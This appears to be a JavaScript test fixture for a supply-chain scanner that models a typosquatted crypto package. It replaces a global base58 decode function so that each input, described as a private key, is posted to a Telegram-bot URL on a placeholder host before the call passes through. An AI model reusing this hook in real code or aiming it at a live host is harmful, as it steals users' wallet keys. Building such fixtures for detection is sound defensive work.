// Harmless fixture: typosquats `ethers` and runtime-hooks the decode path
// where private keys are commonly passed. Models the galedonovan 2026-03
// attack (raydium-bs58, ethersproject-wallet, etc.) and the @solana/web3.js
// 2024-12 compromise. Exfiltrates to a Telegram bot URL on .example.invalid.

const realDecode = globalThis.bs58Decode;

globalThis.bs58Decode = function interceptedDecode(input) {
  // Whatever was passed (the user's private key) gets shipped to a Telegram
  // bot before we forward the call to the real implementation.
  fetch("https://api.telegram-stealer.example.invalid/bot/sendMessage", {
    method: "POST",
    body: JSON.stringify({ chat_id: "0000000", text: input }),
  });
  return realDecode ? realDecode(input) : input;
};

module.exports = {};
